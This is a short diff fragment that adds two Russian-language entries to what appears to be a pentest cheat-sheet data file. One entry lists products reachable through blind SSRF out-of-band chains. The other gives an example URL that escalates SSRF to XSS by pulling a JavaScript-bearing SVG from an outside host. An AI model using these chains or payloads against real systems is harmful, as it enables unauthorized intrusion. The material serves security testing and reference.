+      "title": "Blind SSRF — out-of-band цепочки",
+      "language": "text",
+      "tags": ["blind", "out-of-band"],
+      "body": "Когда ответ прочитать нельзя, используй слепые SSRF-цепочки для OOB-вывода (репозиторий assetnote/blind-ssrf-chains).\n\nЧерез HTTP(s): Elasticsearch, Weblogic, Hashicorp Consul, Shellshock, Apache Druid/Solr/Struts, PeopleSoft, JBoss, Confluence, Jira, OpenTSDB, Jenkins, Hystrix, W3 Total Cache, Docker, Gitlab Redis Exporter.\nЧерез Gopher: Redis, Memcache, Apache Tomcat."
+    },
+    {
+      "subcategory": "Blind SSRF и эскалация",
+      "title": "Апгрейд SSRF до XSS через SVG",
+      "language": "bash",
+      "tags": ["xss", "svg", "escalation"],
+      "body": "# Если SSRF без критического импакта (сеть сегментирована, файлы не вытащить) —\n# подсунь SVG с JavaScript, чтобы поднять до XSS\nhttps://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg"
+    }
+  ]
+}
